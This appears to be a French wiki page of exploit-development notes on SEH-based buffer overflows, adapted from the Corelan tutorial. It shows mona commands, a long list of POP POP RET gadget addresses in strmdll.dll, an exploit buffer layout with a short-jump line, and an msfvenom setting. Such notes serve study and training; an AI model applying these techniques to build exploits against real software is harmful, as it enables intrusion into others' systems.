---
title: SEH
permalink: /SEH/
---

# Structured Exception Handler (SEH)

Pour afficher le statut des enregistrements SEH avec mona (ou ALT+S sous Immunity). Cette commande affiche aussi l'offset si on y met un pattern MSF:

``` text
!mona exchain
```

Pour lister les modules sans "SafeSEH":

``` text
!mona nosafeseh
```

Basé sur la troisième partie du cours de [Corelan](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/) sur le développement d'exploits.

La structure global d'un exploit basé sur SEH est la suivante:

``` text
[JUNK][Short JMP          ][Address to POP, POP, RET][NOPs][Shellcode]
[????][Address to next SEH][Address of SEH Handler  ][???????????????]
```

On utilise un pattern pour identifier l'offset nécessaire pour écraser **Address of SEH Handler**. Au moment du crash, immunity bloque l'execution et nous demande si on souhaite lancer l'exception (avec SHIFT+F7/F8/F9). Au moment du blocage on peut voir l'état des adresses liées à SEH en faisant **ALT+S**.

Une fois cela fait il faut écraser cette adresse avec l'adresse d'une instruction de la forme POP, POP, RET. Mona peut servir à faire cela:

``` text
!mona seh -m strmdll.dll
```

Le résultat est le suivant:

``` text
0BADF00D   [+] This mona.py action took 0:00:00
0BADF00D   [+] Command used:
0BADF00D   !mona seh -m strmdll.dll

           ---------- Mona command started on 2016-04-24 07:04:16 (v2.0, rev 566) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Only querying modules strmdll.dll
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 1 modules
0BADF00D       - Querying module strmdll.dll
704D0000   Modules C:\Windows\system32\TAPI32.dll
0BADF00D   [+] Setting pointer access level criteria to 'R', to increase search results
0BADF00D       New pointer access level : R
0BADF00D   [+] Preparing output file 'seh.txt'
0BADF00D       - (Re)setting logfile seh.txt
0BADF00D   [+] Writing results to seh.txt
0BADF00D       - Number of pointers of type 'pop esi # pop edi # ret 0x10' : 1
0BADF00D       - Number of pointers of type 'pop esi # pop edi # ret ' : 1
0BADF00D       - Number of pointers of type 'pop esi # pop ebp # ret 0x0c' : 13
0BADF00D       - Number of pointers of type 'pop ebx # pop ebp # ret 0x10' : 10
0BADF00D       - Number of pointers of type 'pop eax # pop esi # ret ' : 7
0BADF00D       - Number of pointers of type 'pop eax # pop ebp # ret 0x04' : 7
0BADF00D       - Number of pointers of type 'pop eax # pop ebp # ret 0x08' : 4
0BADF00D       - Number of pointers of type 'call dword ptr ss:[ebp-0c]' : 6
0BADF00D       - Number of pointers of type 'pop ebx # pop ebp # ret 0x0c' : 22
0BADF00D       - Number of pointers of type 'pop esi # pop ebp # ret 0x10' : 6
0BADF00D       - Number of pointers of type 'pop esi # pop ebx # ret 0x10' : 1
0BADF00D       - Number of pointers of type 'pop edi # pop esi # ret ' : 48
0BADF00D       - Number of pointers of type 'pop esi # pop ebp # ret 0x1C' : 1
0BADF00D       - Number of pointers of type 'pop esi # pop ebx # ret ' : 24
0BADF00D       - Number of pointers of type 'pop ebx # pop ebp # ret 0x1C' : 1
0BADF00D       - Number of pointers of type 'pop ecx # pop esi # ret ' : 2
0BADF00D       - Number of pointers of type 'pop edi # pop ebp # ret 0x08' : 3
0BADF00D       - Number of pointers of type 'pop eax # pop ebp # ret 0x0c' : 2
0BADF00D       - Number of pointers of type 'pop ebx # pop ebp # ret 0x08' : 41
0BADF00D       - Number of pointers of type 'pop ebp # pop ebx # ret 0x0c' : 3
0BADF00D       - Number of pointers of type 'pop ebx # pop ebp # ret 0x04' : 57
0BADF00D       - Number of pointers of type 'pop edi # pop ebp # ret 0x04' : 1
0BADF00D       - Number of pointers of type 'pop esi # pop ebp # ret 0x04' : 128
0BADF00D       - Number of pointers of type 'call dword ptr ss:[ebp-04]' : 1
0BADF00D       - Number of pointers of type 'pop esi # pop ebp # ret 0x08' : 49
0BADF00D       - Number of pointers of type 'call dword ptr ss:[ebp-18]' : 1
0BADF00D   [+] Results :
48035BC5     0x48035bc5 : pop esi # pop edi # ret 0x10 |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4802C86E     0x4802c86e : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4800564B     0x4800564b : pop esi # pop ebp # ret 0x0c | null {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4800699D     0x4800699d : pop esi # pop ebp # ret 0x0c | null {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4800DAB3     0x4800dab3 : pop esi # pop ebp # ret 0x0c | null {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4800DBAF     0x4800dbaf : pop esi # pop ebp # ret 0x0c | null {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
48018C2F     0x48018c2f : pop esi # pop ebp # ret 0x0c |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4801B752     0x4801b752 : pop esi # pop ebp # ret 0x0c |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
48021FFA     0x48021ffa : pop esi # pop ebp # ret 0x0c |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
48022179     0x48022179 : pop esi # pop ebp # ret 0x0c | ascii {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
48022478     0x48022478 : pop esi # pop ebp # ret 0x0c | ascii {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4802B319     0x4802b319 : pop esi # pop ebp # ret 0x0c |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4802D744     0x4802d744 : pop esi # pop ebp # ret 0x0c |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4802FC91     0x4802fc91 : pop esi # pop ebp # ret 0x0c |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4802FEB2     0x4802feb2 : pop esi # pop ebp # ret 0x0c |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4800C91B     0x4800c91b : pop ebx # pop ebp # ret 0x10 | null {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
4800DED4     0x4800ded4 : pop ebx # pop ebp # ret 0x10 | null {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
48021B81     0x48021b81 : pop ebx # pop ebp # ret 0x10 |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
480244D2     0x480244d2 : pop ebx # pop ebp # ret 0x10 |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
480263C6     0x480263c6 : pop ebx # pop ebp # ret 0x10 |  {PAGE_EXECUTE_READ} [strmdll.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v4.1.00.3936 (C:\Windows\system32\strmdll.dll)
0BADF00D   ... Please wait while I'm processing all remaining results and writing everything to file...
0BADF00D   [+] Done. Only the first 20 pointers are shown here. For more pointers, open seh.txt...
0BADF00D       Found a total of 440 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:01.622000
```

Il faut ensuite ajouter un short jump avant l'adresse. L'exploit construit aura la forme suivante:

``` text
content = "A"*(offset-4)+"\x90\xeb\x05\x90"+"\x6e\xc8\x02\x48"+nop*32+buf+nop*1000
```

### Payloads

Lors de l'utilisation de MSFVenom pour créer un payload il est important d'ajouter le paramètre suivant:

``` text
EXITFUNC=SEH
```

[Category:Exploitation](/Category:Exploitation "wikilink") [Category:Méthodologies](/Category:Méthodologies "wikilink")
